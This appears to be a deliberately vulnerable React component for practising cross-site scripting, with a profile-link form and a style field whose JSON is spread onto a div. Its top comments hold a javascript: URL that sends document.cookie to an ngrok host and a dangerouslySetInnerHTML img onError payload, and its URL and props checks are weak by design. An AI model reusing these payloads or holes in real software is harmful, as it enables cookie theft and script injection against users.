import React, { useState } from "react";
import { Input, Button } from 'reakit'

// javascript:fetch('https://9432-161-22-31-212.ngrok-free.app/images/'+document.cookie, {method: "get", headers: new Headers({"ngrok-skip-browser-warning": "69420"})})
// {"style":{ "backgroundColor": "red", "width": "100px", "height": "100px"}, "dangerouslySetInnerHTML": { "__html": "<img src='a.com' onError='{alert(1)}' />" }}

export const XssTab = () => {
  const [value, setValue] = useState('')
  const [customizedBackground, setCustomizedBackground] = useState('{ "style": { "backgroundColor": "red", "width": "100px", "height": "100px"}}')
  
  const [backgroundProps, setBackgroundProps] = useState({})

  const allowedPlatforms = ['https://www.facebook.com/', 'https://www.instagram.com/', 'https://twitter.com/'];
  const allowedProps = ['style'];

  const applyStyle = () => {
    
    try {
      const parsedJson = JSON.parse(customizedBackground);
      const keys = Object.keys(parsedJson);
      if (keys.every(key => allowedProps.includes(key))) {
        setBackgroundProps(parsedJson);
      } else {
        setBackgroundProps(undefined);
      }
    } catch (e) {
      console.error(e)
      setBackgroundProps(undefined)
    }
  }

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!allowedPlatforms.some(platform => value.startsWith(platform))) {
      alert('Invalid social media URL. Only Facebook, Instagram, and Twitter are allowed.');
    }
  }

  return (
    <div style={{display: 'flex', flexDirection: 'column', alignItems: 'center'}}>

      <h1>Set your profile link</h1>

      <form onSubmit={handleSubmit}>
        <Input style={{width: '90%'}} value={value} onChange={(e) => setValue(e.target.value)}/>
        <Button type="submit">Test profile link</Button>
      </form>

      <h1>Customize your profile background</h1>
      <Input style={{width: '90%'}} value={customizedBackground} onChange={(e) => setCustomizedBackground(e.target.value)}/>
      <Button onClick={applyStyle}>Apply</Button>
      {!backgroundProps && <h4>Error setting styles</h4>}
      <div {...backgroundProps}></div>

    </div>
  )
}